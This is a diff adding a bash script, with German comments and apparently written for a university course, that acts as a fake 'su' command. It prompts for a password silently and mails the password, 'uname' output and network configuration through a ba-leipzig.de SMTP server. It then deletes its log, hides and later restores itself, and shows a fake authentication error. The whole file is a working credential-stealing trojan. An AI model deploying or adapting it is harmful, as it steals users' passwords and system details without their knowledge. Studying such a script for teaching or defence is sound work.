@@ -1,0 +1,51 @@
+#!/bin/bash
+SLEEPTIME=2	# an jeweiliges System anpassen
+INFOFILE="su_info.txt"	# gesammelte Informationen
+SU_HIDDEN=".su"	# verstecktes Script
+RENAME="su_rename"	# rename-Script
+RENAMETIME="30"		# Zeit bis rename in s
+
+# Step 1: Verhalten nachbilden
+echo -n "Passwort: "	# -n : kein Zeilenwechsel
+read -s PASSWORD	# -s : silent, kein Echo
+echo ""			# Zeilenwechsel
+sleep $SLEEPTIME
+# echo "su: Benutzer bei zu Grunde liegendem Authentifizierungsmodul nicht bekannt"
+
+# Step 2: Informationen sammeln
+echo "Wie wurde su aufgerufen: $0"	 > $INFOFILE
+echo "Das Passwort lautet: $PASSWORD"	>> $INFOFILE
+uname -a 				>> $INFOFILE
+/sbin/ifconfig				>> $INFOFILE
+echo ""					>> $INFOFILE # Nachrichtenende: Leerzeile + "."
+echo "."				>> $INFOFILE
+
+# Step 3: Informationen versenden
+mailx -v \
+  -r "vorname.nachname@ba-leipzig.de" \
+  -s "Passwortklau CS18-1" \
+  -S smtp="mail.ba-leipzig.de:587" \
+  -S smtp-use-starttls \
+  -S smtp-auth=login \
+  -S smtp-auth-user="username" \
+  -S smtp-auth-password="geheim9999" \
+  -S ssl-verify=ignore \
+  studierende@cs18-1.ba-leipzig.de \
+  < $INFOFILE > /dev/null 2>&1	# Daten aus INFOFILE senden, keine Ausgaben
+rm $INFOFILE	# sofort nach senden löschen
+
+# Step 4: Script verstecken
+mv su $SU_HIDDEN
+
+# Step 5: Script wiederherstellen
+echo "#!/bin/bash"		 > $RENAME
+echo "rm $RENAME"               >> $RENAME # sofort nach Start löschen
+echo "sleep $RENAMETIME"	>> $RENAME
+echo "mv $SU_HIDDEN su"		>> $RENAME
+echo "exit 0"			>> $RENAME
+chmod 700 $RENAME	# ausführbar machen
+./$RENAME &		# im Hintergrund ausführen
+
+# Step 6: Beenden mit Fehlermeldung
+echo "su: Benutzer bei zu Grunde liegendem Authentifizierungsmodul nicht bekannt"
+exit 1 # Passwortfehler endet mit Fehlercode 1
